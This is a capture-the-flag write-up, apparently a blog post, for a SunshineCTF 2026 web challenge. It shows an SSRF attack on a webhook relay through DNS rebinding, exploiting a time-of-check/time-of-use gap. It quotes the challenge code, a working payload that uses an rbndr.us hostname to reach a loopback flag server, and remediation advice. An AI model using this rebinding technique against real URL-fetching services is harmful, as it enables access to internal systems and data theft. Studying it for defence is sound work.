---
title: "Intergalactic Webhook Service — SunshineCTF 2026"
date: 2026-10-01
tags: [web, ssrf, dns-rebinding, toctou]
ctf: "SunshineCTF 2026"
summary: "SSRF via DNS rebinding (TOCTOU) in a webhook relay service that validates the resolved IP but re-resolves the hostname when making the request."
draft: false
---
## 1. Reconnaissance

The challenge provides source code, which allows for white-box analysis. The application is a webhook relay service: users submit a URL, and the server sends an HTTP POST request to that URL, returning the response to the user.

Reading `app.py` reveals two critical components.

### 1.1 Flag Storage

```python
def load_flag():
    with open('flag.txt', 'r') as f:
        return f.read().strip()

FLAG = load_flag()
```

The flag is read once at startup and stored in memory. The file itself is not served.

### 1.2 Internal Flag Server

```python
class FlagHandler(BaseHTTPRequestHandler):
    def do_POST(self):
        if self.path == '/flag':
            self.send_response(200)
            self.send_header('Content-Type', 'text/plain')
            self.end_headers()
            self.wfile.write(FLAG.encode())
        else:
            self.send_response(404)
            self.end_headers()

threading.Thread(
    target=lambda: HTTPServer(('127.0.0.1', 5001), FlagHandler).serve_forever(),
    daemon=True
).start()
```

A secondary HTTP server is started in a background thread:

- Bound to `127.0.0.1` (loopback only)
- Listening on port `5001`
- Responds only to `POST /flag`
- Returns the flag in the response body

Because it is bound to the loopback interface, it is unreachable from outside the machine.

### 1.3 Objective

The flag is served by an internal-only HTTP server at `http://127.0.0.1:5001/flag`. The attack must coerce the public application into making a request to this endpoint on the attacker's behalf.

---

## 2. Attack Surface Analysis

The public `/trigger` endpoint accepts a user-supplied URL:

```python
@app.route('/trigger', methods=['POST'])
def trigger_webhook():
    [...]
    allowed, reason = is_ip_allowed(url)
    if not allowed:
        return jsonify({'error': reason}), 400
    try:
        resp = requests.post(url, timeout=5, allow_redirects=False)
        return jsonify({'url': url, 'status': resp.status_code, 'response': resp.text}), resp.status_code
    except Exception:
        return jsonify({'url': url, 'error': 'something went wrong'}), 500
```

Observations:

1. The endpoint performs a **POST** request  matching the flag server's `do_POST`.
2. The response body (`resp.text`) is returned to the user  enabling non-blind exploitation.
3. `allow_redirects=False` blocks redirect-based SSRF bypasses.
4. The URL is validated by `is_ip_allowed` before the request is made.

---

## 3. Defense Analysis

```python
def is_ip_allowed(url):
    parsed = urlparse(url)
    host = parsed.hostname or ''
    try:
        ip = socket.gethostbyname(host)
    except Exception:
        return False, f'Could not resolve host'
    ip_obj = ipaddress.ip_address(ip)
    if ip_obj.is_private or ip_obj.is_loopback or ip_obj.is_link_local or ip_obj.is_reserved:
        return False, f'IP "{ip}" not allowed'
    return True, None
```

The validator:

1. Parses the URL and extracts the hostname.
2. Resolves the hostname to an IPv4 address via `socket.gethostbyname`.
3. Uses `ipaddress` to reject private, loopback, link-local, and reserved ranges.

This is a reasonably robust blocklist. It defeats:

- Direct loopback attempts (`127.0.0.1`)
- Private range attempts (`10.x`, `192.168.x`, `172.16-31.x`)
- Cloud metadata attempts (`169.254.169.254`)
- String-based bypasses (does not rely on substring matching)

Combined with `allow_redirects=False`, the common bypass vectors are closed.

---

## 4. Vulnerability: TOCTOU / DNS Rebinding

### 4.1 Root Cause

The validator resolves the hostname to validate it, then the HTTP client resolves the **same hostname again** when making the request:

```python
ip = socket.gethostbyname(host)      # DNS LOOKUP #1 (validation)
...
resp = requests.post(url, ...)        # DNS LOOKUP #2 (connection)
```

The original URL (hostname) is passed to `requests.post`, not the resolved IP. Consequently, `requests` performs an independent DNS resolution. Between lookup #1 and lookup #2, the DNS answer is free to change.

This is a **Time-Of-Check to Time-Of-Use (TOCTOU)** vulnerability. The check validates one IP; the request may use a different IP.

### 4.2 Exploitation via DNS Rebinding

An attacker controls a domain whose authoritative DNS server alternates between two IPs:

- `1.1.1.1` (public — passes validation)
- `127.0.0.1` (loopback — reaches the flag server)

If lookup #1 returns `1.1.1.1` and lookup #2 returns `127.0.0.1`, the validation passes and the connection is made to the internal flag server.

### 4.3 Tooling: rbndr.us

`rbndr.us` is a public DNS rebinding service. It accepts a hostname encoding two IP addresses in hexadecimal and returns one of them at random on each query, with TTL 0 (no caching).

Encoding:

- `1.1.1.1` → `01010101`
- `127.0.0.1` → `7f000001`

Resulting hostname:

```
01010101.7f000001.rbndr.us
```

Each DNS lookup returns either `1.1.1.1` or `127.0.0.1`, with a 50/50 probability.

### 4.4 Success Probability

Each request performs two independent DNS lookups. The four possible outcomes:

| Lookup #1 (check) | Lookup #2 (request) | Result |
|---|---|---|
| 1.1.1.1 | 1.1.1.1 | Passes check; request goes to public IP |
| 1.1.1.1 | 127.0.0.1 | Passes check; request hits loopback — **exploit succeeds** |
| 127.0.0.1 | 1.1.1.1 | Fails check |
| 127.0.0.1 | 127.0.0.1 | Fails check |

Probability of success per request: **25%**. Approximately four attempts on average.

---

## 5. Exploitation

### 5.1 Payload

```http
POST /trigger HTTP/1.1
Host: supernova.sunshinectf.games
Content-Type: application/json

{
  "url": "http://01010101.7f000001.rbndr.us:5001/flag"
}
```

### 5.2 Attack Flow

1. Attacker submits the payload.
2. Server executes `is_ip_allowed`:
   - `socket.gethostbyname("01010101.7f000001.rbndr.us")` → `1.1.1.1`
   - All checks pass → `allowed=True`
3. Server executes `requests.post`:
   - `requests` performs an independent DNS lookup
   - DNS returns `127.0.0.1`
   - Connection established to `127.0.0.1:5001`
   - `POST /flag` is sent
4. Flag server returns the flag.
5. `/trigger` returns the flag in the JSON response.

### 5.3 Retry Loop

Because the DNS answer is randomized, the payload must be submitted repeatedly until the check and the request receive different IPs. Typically 4–20 attempts.

### 5.4 Expected Response

```json
{
  "url": "http://01010101.7f000001.rbndr.us:5001/flag",
  "status": 200,
  "response": "sun{...}"
}
```

---

## 6. Remediation

### 6.1 Primary Fix  Resolve Once, Use the Resolved IP

Do not pass the user-supplied hostname to the HTTP client. Pass the validated IP address.

```python
ip = socket.gethostbyname(host)
ip_obj = ipaddress.ip_address(ip)
if ip_obj.is_private or ip_obj.is_loopback or ip_obj.is_link_local or ip_obj.is_reserved:
    return False, f'IP "{ip}" not allowed'

resp = requests.post(
    f"http://{ip}:{port}{path}",
    headers={"Host": host},
    timeout=5,
    allow_redirects=False
)
```

Two critical properties:

1. The HTTP client connects to the same IP that was validated no second DNS lookup.
2. The `Host` header is preserved to maintain correct routing on the destination server (virtual hosting, TLS SNI, reverse proxy rules).

### 6.2 Defense-in-Depth

- **Egress proxy:** Route all outbound requests through a dedicated proxy or VPN to prevent origin IP leakage and limit SSRF blast radius.
- **Network segmentation:** Place outbound-request services on isolated network segments without access to sensitive internal systems.
- **Response filtering:** Do not return arbitrary response bodies to users when not necessary.
- **Allowlisting:** Where feasible, allowlist permitted destination hosts instead of relying on blocklists.

